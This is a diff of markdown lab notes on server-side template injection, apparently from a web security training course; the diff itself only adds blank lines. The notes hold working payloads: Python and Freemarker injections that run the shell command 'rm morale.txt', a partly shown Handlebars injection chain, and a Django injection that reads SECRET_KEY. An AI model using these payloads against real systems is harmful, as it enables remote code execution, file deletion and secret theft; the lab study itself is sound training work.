@@ -76,6 +76,7 @@ blog-post-author-display=__import__("os").system("rm morale.txt")&csrf=2D4a3iCBY
 ###### Lab: Server-side template injection using documentation
 
 Freemarker template (Java-based) injection and remote code execution:
+
 ```java
 ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
 ```
@@ -83,11 +84,13 @@ ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
 ###### Lab: Server-side template injection in an unknown language with a documented exploit
 
 See if there's XSS in the query parameters. Otherwise, template inject:
+
 ```
 {{1/0}}
 ```
 
 Handlebars template injection:
+
 ```
 wrtz{{#with "s" as |string|}} 
 {{#with "e"}} 
@@ -115,6 +118,7 @@ wrtz{{#with "s" as |string|}}
 ###### Lab: Server-side template injection with information disclosure via user-supplied objects
 
 To catch the **Django's SECRET_KEY** just inject:
+
 ```
 {{settings.SECRET_KEY}}
 ```
